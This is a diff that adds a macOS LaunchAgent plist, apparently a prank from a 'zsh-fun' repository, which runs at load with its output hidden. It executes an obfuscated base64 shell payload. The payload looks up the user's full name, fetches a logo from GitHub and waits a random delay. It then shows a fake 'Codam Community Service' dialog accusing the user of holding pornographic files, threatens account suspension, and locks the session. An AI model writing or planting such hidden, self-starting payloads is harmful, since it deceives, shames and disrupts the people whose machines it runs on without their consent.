@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+   <dict>
+      <key>Label</key>
+      <string>nl.zsh-fun.ugotpranked</string>
+      <key>ProgramArguments</key>
+      <array>
+         <string>sh</string>
+         <string>-c</string>
+         <string>echo Q0RfRlVMTF9OQU1FPSQoZmluZ2VyICQod2hvYW1pKSB8IHBlcmwgLW5lICcvTmFtZTogKFthLXpBLVowLTkgXXsxLH0pLyAmJiBwcmludCAiJDFcbiInKQoKQ0RfVE1QX0RJUj0kKG1rdGVtcCAtZCkKCmN1cmwgLUwgLXMgImh0dHBzOi8vZ2l0aHViLmNvbS9Db2RhbVNjcmlwdHMvenNoLWZ1bi9ibG9iL21hc3Rlci9sb2dvLnBuZz9yYXc9dHJ1ZSIgLW8gJENEX1RNUF9ESVIvbG9nby5wbmcKCm9zYXNjcmlwdCA8PCBFT0YKc2V0IHJhbiB0byByYW5kb20gbnVtYmVyIGZyb20gNjAgdG8gNjAwCmRlbGF5IHJhbgpzZXQgYyB0byAiJENEX1RNUF9ESVIiICYgIi9sb2dvLnBuZyIKc2V0IGYgdG8gUE9TSVggZmlsZSBjCmRpc3BsYXkgZGlhbG9nICJEZWFyICRDRF9GVUxMX05BTUUsIFxuRHVyaW5nIHRoZSBsYXN0IHN5c3RlbSBzY2FuIHdlIG5vdGljZWQgZm9yYmlkZGVuIGZpbGVzIG9uIHlvdXIgY29tcHV0ZXI6IFwiL3Zhci9mb2xkZXJzL3p6L3p5eHZweHZxNmNzZnh2bl9uMDAwNWtrdzAwMWNtcS9UL1pyOHB6d1M1L2NhY2hlLy5jaHJvbWUvY2FjaGUuaHR0cC53d3cucG9ybmh1Yi5jb20uP3NlYXJjaC5taWRnZXRzXCIgXG5Zb3VyIGFjY291bnQgd2lsbCBiZSB0ZW1wb3JhcmlseSBzdXNwZW5kZWQuIiBidXR0b25zIHsiU3VzcGVuZCBTZXNzaW9uIn0gZGVmYXVsdCBidXR0b24gMSB3aXRoIHRpdGxlICJDb2RhbSBDb21tdW5pdHkgU2VydmljZSIgd2l0aCBpY29uIGYKaWYgdGhlIGJ1dHRvbiByZXR1cm5lZCBvZiB0aGUgcmVzdWx0IGlzICJTdXNwZW5kIFNlc3Npb24iIHRoZW4KCWRvIHNoZWxsIHNjcmlwdCAiL1N5c3RlbS9MaWJyYXJ5L0NvcmVTZXJ2aWNlcy9NZW51XFxcIEV4dHJhcy9Vc2VyLm1lbnUvQ29udGVudHMvUmVzb3VyY2VzL0NHU2Vzc2lvbiAtc3VzcGVuZCIKZW5kIGlmCkVPRg== | base64 -D | sh</string>
+      </array>
+      <key>RunAtLoad</key>
+      <true />
+      <key>StartInterval</key>
+      <integer>0</integer>
+      <key>LaunchOnlyOnce</key>
+      <true />
+      <key>StandardErrorPath</key>
+      <string>/dev/null</string>
+      <key>StandardOutPath</key>
+      <string>/dev/null</string>
+   </dict>
+</plist>
